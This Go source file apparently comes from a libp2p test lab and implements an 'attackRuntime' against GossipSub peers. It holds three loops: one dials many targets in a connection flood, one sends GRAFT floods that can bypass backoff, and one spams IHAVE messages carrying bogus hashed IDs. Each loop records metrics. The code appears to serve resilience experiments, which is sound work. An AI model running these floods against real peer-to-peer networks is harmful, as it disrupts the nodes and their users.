package peer

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"sync"
	"time"

	"github.com/k-p2p-lab/kpl-v3/internal/model"
	pubsub "github.com/libp2p/go-libp2p-pubsub"
	pb "github.com/libp2p/go-libp2p-pubsub/pb"
	corenetwork "github.com/libp2p/go-libp2p/core/network"
	corepeer "github.com/libp2p/go-libp2p/core/peer"
)

func (r *attackRuntime) connectionLoop(ctx context.Context) {
	c := r.policy.Load().config.ConnectionAttack
	interval, _ := time.ParseDuration(c.RetryInterval)
	nextCandidate := 0
	r.periodic(ctx, interval, func() {
		registry := r.registry.Load()
		if registry == nil || time.Since(registry.observedAt) > attackRegistryMaxAge {
			r.count("connectionAttack", "unknown", 1)
			return
		}
		var candidates []model.AttackTarget
		connected := map[string]bool{}
		seen := map[string]bool{}
		for _, target := range registry.targets {
			if !target.Ready || target.PeerID == r.server.host.ID().String() {
				continue
			}
			if seen[target.PeerID] {
				continue
			}
			seen[target.PeerID] = true
			matched, known := matchAttackTransport(registry, c.Targets, target.PeerID)
			if !known {
				r.count("connectionAttack", "unknown", 1)
			}
			if !matched {
				continue
			}
			id, err := corepeer.Decode(target.PeerID)
			if err != nil {
				continue
			}
			if r.server.host.Network().Connectedness(id) == corenetwork.Connected {
				connected[target.PeerID] = true
			} else {
				// One transport may have several selected Node aliases. Offer
				// every ready alias's address to the same dial, retaining fallback
				// routes without broadening an ambiguous selector or mutating the
				// immutable registry. Use the same snapshot as target selection.
				if aliases := registry.byTransport[target.PeerID]; len(aliases) > 1 {
					target.Addresses = nil
					addresses := make(map[string]bool)
					for _, index := range aliases {
						alias := registry.targets[index]
						if !alias.Ready {
							continue
						}
						for _, address := range alias.Addresses {
							if !addresses[address] {
								addresses[address] = true
								target.Addresses = append(target.Addresses, address)
							}
						}
					}
				}
				candidates = append(candidates, target)
			}
		}
		r.count("connectionAttack", "rounds", 1)
		r.count("connectionAttack", "candidateObservations", uint64(len(candidates)+len(connected)))
		r.count("connectionAttack", "connectedObservations", uint64(len(connected)))
		budget := discoveryConnectionBudget(r.policy.Load().config.Libp2p.ConnectionLimit, len(r.server.host.Network().Conns()), max(0, *c.TargetConnections-len(connected)))
		if budget == 0 {
			return
		}
		roundCtx, stop := context.WithTimeout(ctx, 5*time.Second)
		defer stop()
		slots := make(chan struct{}, 8)
		var pending sync.WaitGroup
		defer pending.Wait()
		attempted := map[string]bool{}
		for visited := 0; visited < len(candidates); visited++ {
			if budget == 0 || roundCtx.Err() != nil {
				return
			}
			// A failed ready candidate still consumes a dial attempt. Continue
			// through the remaining candidates on later rounds, so unreachable
			// entries at the front cannot permanently starve healthy targets.
			nextCandidate %= len(candidates)
			target := candidates[nextCandidate]
			nextCandidate++
			if attempted[target.PeerID] {
				continue
			}
			attempted[target.PeerID] = true
			info, err := addrInfo(bootstrapNode{NodeID: target.NodeID, PeerID: target.PeerID, Addresses: target.Addresses})
			if err != nil {
				continue
			}
			select {
			case slots <- struct{}{}:
			case <-roundCtx.Done():
				return
			}
			budget--
			pending.Add(1)
			go func() {
				defer pending.Done()
				defer func() { <-slots }()
				r.count("connectionAttack", "dialAttempts", 1)
				if err := r.server.host.Connect(roundCtx, info); err != nil {
					r.count("connectionAttack", "dialFailures", 1)
				} else {
					r.count("connectionAttack", "dialSucceeded", 1)
				}
			}()
		}
	})
}
func (r *attackRuntime) sendControl(ctx context.Context, kind string, id corepeer.ID, control *pb.ControlMessage, respectBackoff bool) {
	result, err := r.server.pubsub.SendExperimentalGossipSubControl(ctx, id, control, respectBackoff)
	if err != nil {
		r.count(kind, "sendUncertain", 1)
		return
	}
	r.recordControlResult(kind, result)
}
func (r *attackRuntime) recordControlResult(kind string, result pubsub.ExperimentalControlResult) {
	if result.SuppressedGrafts > 0 {
		r.count(kind, "suppressedGrafts", uint64(result.SuppressedGrafts))
	}
	if result.Queued > 0 {
		r.count(kind, "queuedRPCs", uint64(result.Queued))
	}
	if result.Dropped > 0 {
		r.count(kind, "droppedRPCs", uint64(result.Dropped))
	}
	if result.Skipped > 0 {
		r.count(kind, "skippedRequests", uint64(result.Skipped))
	}
}
func (r *attackRuntime) controlTargets(kind string, selector *model.AttackSelector, topic string) []corepeer.ID {
	var result []corepeer.ID
	for _, id := range r.server.pubsub.ListPeers(topic) {
		matched, known := r.matchTransport(selector, id.String())
		if !known {
			r.count(kind, "unknown", 1)
		}
		if matched {
			result = append(result, id)
		}
	}
	return result
}
func (r *attackRuntime) graftLoop(ctx context.Context) {
	c := r.policy.Load().config.GraftFlood
	interval, _ := time.ParseDuration(c.Interval)
	r.periodic(ctx, interval, func() {
		roundCtx, stop := context.WithTimeout(ctx, 5*time.Second)
		defer stop()
		for _, topic := range c.Topics {
			for _, id := range r.controlTargets("graftFlood", c.Targets, topic) {
				if roundCtx.Err() != nil {
					return
				}
				grafts := make([]*pb.ControlGraft, *c.GraftsPerPeer)
				for i := range grafts {
					grafts[i] = &pb.ControlGraft{TopicID: &topic}
				}
				r.count("graftFlood", "generatedGrafts", uint64(len(grafts)))
				r.sendControl(roundCtx, "graftFlood", id, &pb.ControlMessage{Graft: grafts}, *c.RespectBackoff)
			}
		}
	})
}
func (r *attackRuntime) ihaveLoop(ctx context.Context) {
	c := r.policy.Load().config.IHaveSpam
	interval, _ := time.ParseDuration(c.Interval)
	var sequence uint64
	r.periodic(ctx, interval, func() {
		roundCtx, stop := context.WithTimeout(ctx, 5*time.Second)
		defer stop()
		for _, topic := range c.Topics {
			for _, id := range r.controlTargets("ihaveSpam", c.Targets, topic) {
				for range *c.RPCsPerPeer {
					if roundCtx.Err() != nil {
						return
					}
					sequence++
					ids := make([]string, *c.IDsPerRPC)
					for i := range ids {
						hash := sha256.Sum256([]byte(fmt.Sprintf("kpl-bogus-ihave:%d:%s:%s:%s:%d:%d", r.server.config.Seed, r.server.config.Node.ID, id, topic, sequence, i)))
						ids[i] = hex.EncodeToString(hash[:])
					}
					r.count("ihaveSpam", "generatedRPCs", 1)
					r.count("ihaveSpam", "generatedIDs", uint64(len(ids)))
					r.sendControl(roundCtx, "ihaveSpam", id, &pb.ControlMessage{Ihave: []*pb.ControlIHave{{TopicID: &topic, MessageIDs: ids}}}, false)
				}
			}
		}
	})
}
